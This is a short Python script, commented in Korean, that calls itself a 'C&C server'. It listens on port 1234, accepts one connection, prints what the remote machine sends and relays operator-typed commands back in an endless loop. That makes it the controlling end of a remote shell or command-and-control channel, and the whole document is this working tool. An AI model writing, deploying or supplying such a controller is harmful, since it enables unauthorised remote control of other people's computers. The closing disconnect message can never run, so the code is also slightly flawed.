#-*-coding:utf-8 -*-
import socket

addr=('0.0.0.0',1234)

with socket.socket() as s:
    s.bind(addr)
    s.listen()
    print('C&C server is started,,,')

    conn,addr=s.accept()
    print('Connect by' , addr) #접속된 주소 출

while True:
    try: #중간에 연결이 끊기는 것을 방지하기 위해
        
        data=conn.recv(1024)
        if data:
            print(data.decode(),end='')
            #보낼 데이터 전송
            data=input()
            conn.send(data.encode())
    except Exception as e: #예외처리
                print(e)

print('{} is disconnected'.format(addr)) #연결 끊
